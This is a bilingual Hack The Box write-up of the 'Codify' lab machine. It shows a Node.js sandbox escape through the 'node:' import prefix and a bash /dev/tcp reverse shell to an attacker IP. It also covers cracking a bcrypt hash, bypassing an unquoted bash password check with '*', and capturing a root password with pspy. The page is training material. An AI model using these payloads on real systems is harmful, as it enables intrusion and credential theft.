@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>codify | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">codify</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Node.js code editor web application that attempted to sandbox code execution by blocking certain dangerous modules like <code>child_process</code>, <code>fs</code>, and dynamic imports. However, by using the explicitly allowed <code>node:</code> protocol prefix to import core modules, I was able to bypass these restrictions and gain remote code execution as the <code>svc</code> user. After obtaining initial access, I discovered an SQLite database containing a bcrypt password hash for the user <code>joshua</code>, which I successfully cracked. With SSH access as <code>joshua</code>, I identified sudo permissions to run a MySQL backup script as root. This script had a critical vulnerability: it used an unquoted bash variable comparison (<code>[[ $DB_PASS == $USER_PASS ]]</code>), allowing wildcard pattern matching to bypass the password check. By exploiting this vulnerability and monitoring running processes with <code>pspy</code>, I captured the root MySQL password that was passed as a plaintext command-line argument, which happened to be the same as the root user's password, granting me full system access.</p>
+                    <p><strong>Technologies/Exploits:</strong> Node.js sandbox bypass via <code>node:</code> protocol prefix, SQLite database enumeration, bcrypt hash cracking, bash wildcard pattern matching in unquoted variable comparisons, process monitoring for credential extraction.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I begin with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image2.png" alt="Nmap scan results showing open ports including SSH on port 22, HTTP on port 80, and another service on port 3000" /></p>
+                
+                <p>The scan reveals several services, including SSH on port 22 and HTTP services on ports 80 and 3000. I add <code>codify.htb</code> to my <code>/etc/hosts</code> file to resolve the domain properly.</p>
+                
+                <h2>Web Application Analysis - Node.js Code Editor</h2>
+                <p>Navigating to the web application, I discover it's a Node.js code editor that allows users to test and run Node.js code in a sandboxed environment. The application advertises security features that block potentially dangerous modules and operations:</p>
+                <ul>
+                    <li>The <code>child_process</code> module (used for executing system commands)</li>
+                    <li>The <code>fs</code> module (used for filesystem operations)</li>
+                    <li>Dynamic imports that could load arbitrary modules</li>
+                </ul>
+                
+                <p>These restrictions are designed to prevent code execution and sandbox escapes. However, security implementations in sandboxed environments often have subtle bypasses.</p>
+                
+                <h2>Initial Access - Bypassing the Node.js Sandbox</h2>
+                <p>After experimenting with the code editor, I discover a critical bypass. While the application blocks traditional module imports like <code>require('child_process')</code>, it doesn't properly restrict the use of the <code>node:</code> protocol prefix when importing core Node.js modules.</p>
+                
+                <p>The <code>node:</code> prefix is a Node.js feature that explicitly specifies that a module is a core Node.js module. By using <code>require('node:child_process')</code> instead of <code>require('child_process')</code>, I can bypass the sandbox restrictions:</p>
+                
+                <p><img src="./media/image1.png" alt="Node.js code editor showing the bypass payload using the node: protocol prefix" /></p>
+                
+                <p>I craft a reverse shell payload using this bypass technique:</p>
+                <pre><code class="language-javascript">const { exec } = require('node:child_process');
+
+exec('bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"', (err, stdout, stderr) => {
+  if (err) console.error(err);
+  else console.log(stdout);
+});</code></pre>
+                
+                <p>Before executing the payload, I set up a netcat listener on my attacking machine:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                
+                <p>When I execute the code in the editor, my Python HTTP server receives the connection attempt, and I successfully obtain a reverse shell as the <code>svc</code> user:</p>
+                <pre><code class="language-bash">connect to [10.10.16.2] from (UNKNOWN) [10.10.11.239] 52846
+bash: cannot set terminal process group (1234): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@codify:~/app$</code></pre>
+                
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>After gaining initial access, I perform enumeration to identify potential privilege escalation vectors. First, I check for listening ports on the local system:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+                
+                <p>The output reveals several interesting locally-bound services:</p>
+                <pre><code class="language-plaintext">tcp LISTEN 0 4096 127.0.0.1:3306
+tcp LISTEN 0 4096 127.0.0.1:36823</code></pre>
+                
+                <p>Port 3306 indicates that MySQL is running locally, which is worth investigating for potential credentials or sensitive data.</p>
+                
+                <h3>Discovering the MySQL Backup Script</h3>
+                <p>While exploring the filesystem, I discover an interesting script at <code>/opt/scripts/mysql-backup.sh</code>:</p>
+                <pre><code class="language-bash">#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'</code></pre>
+                
+                <p>This script is particularly interesting because it reads the root MySQL password from <code>/root/.creds</code> and compares it with user input. However, I notice a critical vulnerability in the comparison logic that I'll exploit later.</p>
+                
+                <h3>SQLite Database Discovery</h3>
+                <p>Continuing my enumeration, I discover an SQLite database in the web application directory at <code>/var/www/contact/tickets.db</code>:</p>
+                <pre><code class="language-bash">svc@codify:/var/www/contact$ sqlite3 tickets.db
+SQLite version 3.37.2
+Enter ".help" for usage hints.
+sqlite> .tables
+tickets users
+sqlite> select * from users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</code></pre>
+                
+                <p>The database contains a users table with credentials for a user named <code>joshua</code>. The password is stored as a bcrypt hash: <code>$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</code></p>
+                
+                <h2>Lateral Movement - Cracking the bcrypt Hash</h2>
+                <p>I save the hash to a file and use hashcat to crack it. Bcrypt hashes use mode 3200 in hashcat:</p>
+                <pre><code class="language-bash">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+                
+                <p>After some time, hashcat successfully cracks the password:</p>
+                <pre><code class="language-plaintext">$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1</code></pre>
+                
+                <p>With these credentials (<code>joshua:spongebob1</code>), I can now SSH into the machine as the <code>joshua</code> user and retrieve the user flag.</p>
+                
+                <h2>Privilege Escalation - Sudo Permissions Analysis</h2>
+                <p>After logging in as <code>joshua</code>, I check for sudo permissions:</p>
+                <pre><code class="language-bash">joshua@codify:~$ sudo -l
+[sudo] password for joshua: 
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh</code></pre>
+                
+                <p>The user <code>joshua</code> can execute the MySQL backup script I discovered earlier as root. Now I need to analyze the script for vulnerabilities.</p>
+                
+                <h3>Understanding the Bash Comparison Vulnerability</h3>
+                <p>Looking at the password comparison in the script:</p>
+                <pre><code class="language-bash">if [[ $DB_PASS == $USER_PASS ]]; then
+    /usr/bin/echo "Password confirmed!"
+else
+    /usr/bin/echo "Password confirmation failed!"
+    exit 1
+fi</code></pre>
+                
+                <p>The critical vulnerability here is that the variables are not quoted in the comparison. In bash, when variables are unquoted in a <code>[[ ]]</code> comparison, they undergo pattern matching (globbing) rather than literal string comparison. This means I can use wildcard characters like <code>*</code> to match any string.</p>
+                
+                <p>If I enter <code>*</code> as the password, the comparison becomes <code>[[ $DB_PASS == * ]]</code>, which will always evaluate to true because the asterisk matches any string, regardless of what the actual password is.</p>
+                
+                <h3>Exploiting the Vulnerability with Process Monitoring</h3>
+                <p>While the wildcard bypass allows me to execute the script, I still need to obtain the actual root password. The key observation is that when the script runs MySQL commands, it passes the password as a command-line argument using the <code>-p</code> flag:</p>
+                <pre><code class="language-bash">/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;"</code></pre>
+                
+                <p>Command-line arguments are visible in the process list, which means I can capture the password by monitoring running processes. I upload <code>pspy</code>, a tool that monitors Linux processes without requiring root privileges, to the target machine.</p>
+                
+                <p>I start <code>pspy</code> in one terminal session and execute the backup script with the wildcard bypass in another:</p>
+                <pre><code class="language-bash">joshua@codify:/opt/scripts$ sudo ./mysql-backup.sh
+Enter MySQL password for root: *
+Password confirmed!
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Backing up database: mysql
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+Backing up database: sys
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+All databases backed up successfully!
+Changing the permissions
+Done!</code></pre>
+                
+                <p>Meanwhile, <code>pspy</code> captures the MySQL command with the password in plaintext:</p>
+                <pre><code class="language-plaintext">CMD: UID=0 PID=2964 | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;</code></pre>
+                
+                <p>I've successfully captured the root MySQL password: <code>kljh12k3jhaskjh12kjh3</code></p>
+                
+                <h2>Root Access</h2>
+                <p>With the captured password, I attempt to switch to the root user:</p>
+                <pre><code class="language-bash">su root
+Password: kljh12k3jhaskjh12kjh3</code></pre>
+                
+                <p>The password works! It turns out the root system password is the same as the MySQL root password. I now have full root access to the system and can retrieve the root flag, completing the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web de editor de código Node.js que intentaba crear un sandbox para la ejecución de código bloqueando ciertos módulos peligrosos como <code>child_process</code>, <code>fs</code> e importaciones dinámicas. Sin embargo, utilizando el prefijo de protocolo <code>node:</code> explícitamente permitido para importar módulos principales, pude eludir estas restricciones y conseguir ejecución remota de código como usuario <code>svc</code>. Tras obtener el acceso inicial, descubrí una base de datos SQLite conteniendo un hash de contraseña bcrypt para el usuario <code>joshua</code>, que conseguí crackear exitosamente. Con acceso SSH como <code>joshua</code>, identifiqué permisos sudo para ejecutar un script de backup de MySQL como root. Este script tenía una vulnerabilidad crítica: utilizaba una comparación de variables bash sin comillas (<code>[[ $DB_PASS == $USER_PASS ]]</code>), permitiendo el uso de patrones wildcard para eludir la verificación de contraseña. Explotando esta vulnerabilidad y monitorizando procesos en ejecución con <code>pspy</code>, capturé la contraseña MySQL de root que se pasaba como argumento de línea de comandos en texto plano, la cual resultó ser la misma que la contraseña del usuario root del sistema, otorgándome acceso completo.</p>
+                    <p><strong>Tecnologías/Exploits:</strong> Bypass de sandbox de Node.js mediante prefijo de protocolo <code>node:</code>, enumeración de base de datos SQLite, cracking de hash bcrypt, coincidencia de patrones wildcard en bash en comparaciones de variables sin comillas, monitorización de procesos para extracción de credenciales.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image2.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22, HTTP en el puerto 80 y otro servicio en el puerto 3000" /></p>
+                
+                <p>El escaneo revela varios servicios, incluyendo SSH en el puerto 22 y servicios HTTP en los puertos 80 y 3000. Añado <code>codify.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio correctamente.</p>
+                
+                <h2>Análisis de la Aplicación Web - Editor de Código Node.js</h2>
+                <p>Navegando a la aplicación web, descubro que es un editor de código Node.js que permite a los usuarios probar y ejecutar código Node.js en un entorno aislado. La aplicación anuncia características de seguridad que bloquean módulos y operaciones potencialmente peligrosos:</p>
+                <ul>
+                    <li>El módulo <code>child_process</code> (usado para ejecutar comandos del sistema)</li>
+                    <li>El módulo <code>fs</code> (usado para operaciones del sistema de archivos)</li>
+                    <li>Importaciones dinámicas que podrían cargar módulos arbitrarios</li>
+                </ul>
+                
+                <p>Estas restricciones están diseñadas para prevenir la ejecución de código y escapes del sandbox. Sin embargo, las implementaciones de seguridad en entornos aislados a menudo tienen bypasses sutiles.</p>
+                
+                <h2>Acceso Inicial - Eludiendo el Sandbox de Node.js</h2>
+                <p>Tras experimentar con el editor de código, descubro un bypass crítico. Aunque la aplicación bloquea importaciones de módulos tradicionales como <code>require('child_process')</code>, no restringe adecuadamente el uso del prefijo de protocolo <code>node:</code> al importar módulos principales de Node.js.</p>
+                
+                <p>El prefijo <code>node:</code> es una característica de Node.js que especifica explícitamente que un módulo es un módulo principal de Node.js. Usando <code>require('node:child_process')</code> en lugar de <code>require('child_process')</code>, puedo eludir las restricciones del sandbox:</p>
+                
+                <p><img src="./media/image1.png" alt="Editor de código Node.js mostrando el payload de bypass usando el prefijo de protocolo node:" /></p>
+                
+                <p>Elaboro un payload de reverse shell usando esta técnica de bypass:</p>
+                <pre><code class="language-javascript">const { exec } = require('node:child_process');
+
+exec('bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"', (err, stdout, stderr) => {
+  if (err) console.error(err);
+  else console.log(stdout);
+});</code></pre>
+                
+                <p>Antes de ejecutar el payload, configuro un listener de netcat en mi máquina atacante:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+                
+                <p>Cuando ejecuto el código en el editor, mi servidor HTTP de Python recibe el intento de conexión, y obtengo exitosamente una reverse shell como el usuario <code>svc</code>:</p>
+                <pre><code class="language-bash">connect to [10.10.16.2] from (UNKNOWN) [10.10.11.239] 52846
+bash: cannot set terminal process group (1234): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@codify:~/app$</code></pre>
+                
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Tras conseguir el acceso inicial, realizo enumeración para identificar vectores potenciales de escalada de privilegios. Primero, compruebo los puertos en escucha en el sistema local:</p>
+                <pre><code class="language-bash">ss -tuln</code></pre>
+                
+                <p>La salida revela varios servicios interesantes ligados localmente:</p>
+                <pre><code class="language-plaintext">tcp LISTEN 0 4096 127.0.0.1:3306
+tcp LISTEN 0 4096 127.0.0.1:36823</code></pre>
+                
+                <p>El puerto 3306 indica que MySQL está ejecutándose localmente, lo cual vale la pena investigar en busca de credenciales potenciales o datos sensibles.</p>
+                
+                <h3>Descubriendo el Script de Backup de MySQL</h3>
+                <p>Mientras exploro el sistema de archivos, descubro un script interesante en <code>/opt/scripts/mysql-backup.sh</code>:</p>
+                <pre><code class="language-bash">#!/bin/bash
+DB_USER="root"
+DB_PASS=$(/usr/bin/cat /root/.creds)
+BACKUP_DIR="/var/backups/mysql"
+
+read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
+/usr/bin/echo
+
+if [[ $DB_PASS == $USER_PASS ]]; then
+        /usr/bin/echo "Password confirmed!"
+else
+        /usr/bin/echo "Password confirmation failed!"
+        exit 1
+fi
+
+/usr/bin/mkdir -p "$BACKUP_DIR"
+
+databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")
+
+for db in $databases; do
+    /usr/bin/echo "Backing up database: $db"
+    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
+done
+
+/usr/bin/echo "All databases backed up successfully!"
+/usr/bin/echo "Changing the permissions"
+/usr/bin/chown root:sys-adm "$BACKUP_DIR"
+/usr/bin/chmod 774 -R "$BACKUP_DIR"
+/usr/bin/echo 'Done!'</code></pre>
+                
+                <p>Este script es particularmente interesante porque lee la contraseña MySQL de root desde <code>/root/.creds</code> y la compara con la entrada del usuario. Sin embargo, observo una vulnerabilidad crítica en la lógica de comparación que explotaré más adelante.</p>
+                
+                <h3>Descubrimiento de Base de Datos SQLite</h3>
+                <p>Continuando mi enumeración, descubro una base de datos SQLite en el directorio de la aplicación web en <code>/var/www/contact/tickets.db</code>:</p>
+                <pre><code class="language-bash">svc@codify:/var/www/contact$ sqlite3 tickets.db
+SQLite version 3.37.2
+Enter ".help" for usage hints.
+sqlite> .tables
+tickets users
+sqlite> select * from users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</code></pre>
+                
+                <p>La base de datos contiene una tabla de usuarios con credenciales para un usuario llamado <code>joshua</code>. La contraseña está almacenada como un hash bcrypt: <code>$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</code></p>
+                
+                <h2>Movimiento Lateral - Crackeando el Hash bcrypt</h2>
+                <p>Guardo el hash en un archivo y uso hashcat para crackearlo. Los hashes bcrypt usan el modo 3200 en hashcat:</p>
+                <pre><code class="language-bash">hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+                
+                <p>Después de un tiempo, hashcat crackea exitosamente la contraseña:</p>
+                <pre><code class="language-plaintext">$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1</code></pre>
+                
+                <p>Con estas credenciales (<code>joshua:spongebob1</code>), ahora puedo conectarme mediante SSH a la máquina como el usuario <code>joshua</code> y recuperar la flag de usuario.</p>
+                
+                <h2>Escalada de Privilegios - Análisis de Permisos Sudo</h2>
+                <p>Tras iniciar sesión como <code>joshua</code>, compruebo los permisos sudo:</p>
+                <pre><code class="language-bash">joshua@codify:~$ sudo -l
+[sudo] password for joshua: 
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh</code></pre>
+                
+                <p>El usuario <code>joshua</code> puede ejecutar el script de backup de MySQL que descubrí anteriormente como root. Ahora necesito analizar el script en busca de vulnerabilidades.</p>
+                
+                <h3>Entendiendo la Vulnerabilidad de Comparación en Bash</h3>
+                <p>Observando la comparación de contraseña en el script:</p>
+                <pre><code class="language-bash">if [[ $DB_PASS == $USER_PASS ]]; then
+    /usr/bin/echo "Password confirmed!"
+else
+    /usr/bin/echo "Password confirmation failed!"
+    exit 1
+fi</code></pre>
+                
+                <p>La vulnerabilidad crítica aquí es que las variables no están entre comillas en la comparación. En bash, cuando las variables no tienen comillas en una comparación <code>[[ ]]</code>, se someten a coincidencia de patrones (globbing) en lugar de comparación literal de cadenas. Esto significa que puedo usar caracteres wildcard como <code>*</code> para coincidir con cualquier cadena.</p>
+                
+                <p>Si introduzco <code>*</code> como contraseña, la comparación se convierte en <code>[[ $DB_PASS == * ]]</code>, que siempre evaluará como verdadero porque el asterisco coincide con cualquier cadena, independientemente de cuál sea la contraseña real.</p>
+                
+                <h3>Explotando la Vulnerabilidad con Monitorización de Procesos</h3>
+                <p>Aunque el bypass de wildcard me permite ejecutar el script, todavía necesito obtener la contraseña real de root. La observación clave es que cuando el script ejecuta comandos MySQL, pasa la contraseña como argumento de línea de comandos usando la bandera <code>-p</code>:</p>
+                <pre><code class="language-bash">/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;"</code></pre>
+                
+                <p>Los argumentos de línea de comandos son visibles en la lista de procesos, lo que significa que puedo capturar la contraseña monitorizando procesos en ejecución. Subo <code>pspy</code>, una herramienta que monitoriza procesos de Linux sin requerir privilegios de root, a la máquina objetivo.</p>
+                
+                <p>Inicio <code>pspy</code> en una sesión de terminal y ejecuto el script de backup con el bypass de wildcard en otra:</p>
+                <pre><code class="language-bash">joshua@codify:/opt/scripts$ sudo ./mysql-backup.sh
+Enter MySQL password for root: *
+Password confirmed!
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Backing up database: mysql
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
+Backing up database: sys
+mysqldump: [Warning] Using a password on the command line interface can be insecure.
+-- Warning: column statistics not supported by the server.
+All databases backed up successfully!
+Changing the permissions
+Done!</code></pre>
+                
+                <p>Mientras tanto, <code>pspy</code> captura el comando MySQL con la contraseña en texto plano:</p>
+                <pre><code class="language-plaintext">CMD: UID=0 PID=2964 | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;</code></pre>
+                
+                <p>He capturado exitosamente la contraseña MySQL de root: <code>kljh12k3jhaskjh12kjh3</code></p>
+                
+                <h2>Acceso Root</h2>
+                <p>Con la contraseña capturada, intento cambiar al usuario root:</p>
+                <pre><code class="language-bash">su root
+Password: kljh12k3jhaskjh12kjh3</code></pre>
+                
+                <p>¡La contraseña funciona! Resulta que la contraseña del sistema root es la misma que la contraseña MySQL de root. Ahora tengo acceso root completo al sistema y puedo recuperar la flag de root, completando la máquina.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
